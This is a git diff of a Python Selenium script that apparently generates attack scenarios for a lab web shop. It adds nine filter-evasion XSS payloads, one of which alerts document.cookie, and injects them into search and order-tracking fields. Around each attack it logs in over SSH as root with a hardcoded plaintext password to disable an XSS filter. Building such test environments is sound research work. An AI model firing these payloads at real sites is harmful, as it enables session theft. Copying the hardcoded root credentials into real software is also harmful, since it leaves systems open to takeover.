@@ -7,6 +7,7 @@ import random
 import datetime
 import string
 import paramiko
+import base64
 from time import sleep
 from selenium.webdriver.support.ui import Select
 from selenium.common.exceptions import NoSuchElementException
@@ -541,14 +542,17 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
     # 1. Set logstash
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', key_filename='albert_rsa')
-
-    random_sleep(120)
+    ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', key_filename='<your private key>', passphrase='<key passphrase>')
+    stdin, stdout, stderr = ssh.exec_command('make xss-log')
+    if verbose:
+        print (stdout.readlines())
+    
+    sleep(120)
+    ssh.close()
 
     # 2. Check if is log in
     if not is_logged_in:
         scenario_login(driver=driver, verbose=verbose)
-
 
     # 3. Attack under specific pattern
     # 3-1. generate XSS pattern
@@ -558,26 +562,67 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
     attackKeyWordLength = random.randint(1, 15)
     if attackType == 0:
         attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
         attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
     elif attackType == 1:
-        pass
+        attackKeyWord = []
+        for i in range(attackKeyWordLength):
+            attackKeyWord.append(str(random.randint(65, 122)))
+        attack = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(" + ",".join(attackKeyWord) + "))\"></img>"
     elif attackType == 2:
-        pass
+        attackKeyWord = []
+        for i in range(attackKeyWordLength):
+            attackKeyWord.append(str(random.randint(65, 122)))
+        attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
     elif attackType == 3:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
     elif attackType == 4:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
     elif attackType == 5:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
     elif attackType == 6:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
     elif attackType == 7:
-        pass
+        attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
     elif attackType == 8:
-        pass
-
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
+        base64decodeString = base64.b64encode(base64String)
+        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
     
     # 3-2. attack in search bar
+    
+    #4 turn of the xxs filter
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    #ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', key_filename='<your private key>', passphrase='<key passphrase>')
+    ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', password='Iwillchangemypasswdlater')
+    random_sleep()
+    stdin, stdout, stderr = ssh.exec_command('make terminate-xss')
+    if verbose:
+        print (stdout.readlines())
+    random_sleep()    
+    stdin, stdout, stderr = ssh.exec_command('make normal-log')
+    if verbose:
+        print (stdout.readlines())
+    
+    ssh.close()
+
     return
 
 def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
@@ -609,29 +654,52 @@ def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
     attack = ""
     attackType = random.randint(0, 8)
     attackKeyWordLength = random.randint(1, 15)
-    # for testing
-    #if attackType == 0:
-    if True:
+    
+    if attackType == 0:
         attackKeyWord = ""
         for i in range(attackKeyWordLength):
             attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
         attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
     elif attackType == 1:
-        pass
+        attackKeyWord = []
+        for i in range(attackKeyWordLength):
+            attackKeyWord.append(str(random.randint(65, 122)))
+        attack = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(" + ",".join(attackKeyWord) + "))\"></img>"
     elif attackType == 2:
-        pass
+        attackKeyWord = []
+        for i in range(attackKeyWordLength):
+            attackKeyWord.append(str(random.randint(65, 122)))
+        attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
     elif attackType == 3:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
     elif attackType == 4:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
     elif attackType == 5:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
     elif attackType == 6:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
     elif attackType == 7:
-        pass
+        attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
     elif attackType == 8:
-        pass
+        attackKeyWord = ""
+        for i in range(attackKeyWordLength):
+            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
+        base64decodeString = base64.b64encode(base64String)
+        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
+
     
     # 3-2. attack in tracking orders
     random_sleep()
@@ -644,17 +712,19 @@ def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
     #4 turn of the xxs filter
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', key_filename='<your private key>', passphrase='<key passphrase>')
+    #ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', key_filename='<your private key>', passphrase='<key passphrase>')
+    ssh.connect(hostname='vml1wk054.cse.ust.hk', username='root', password='Iwillchangemypasswdlater')
+    random_sleep()
     stdin, stdout, stderr = ssh.exec_command('make terminate-xss')
-    
     if verbose:
         print (stdout.readlines())
+    random_sleep()    
     stdin, stdout, stderr = ssh.exec_command('make normal-log')
-
     if verbose:
         print (stdout.readlines())
     
     ssh.close()
+    
     return
 
 #***********************************
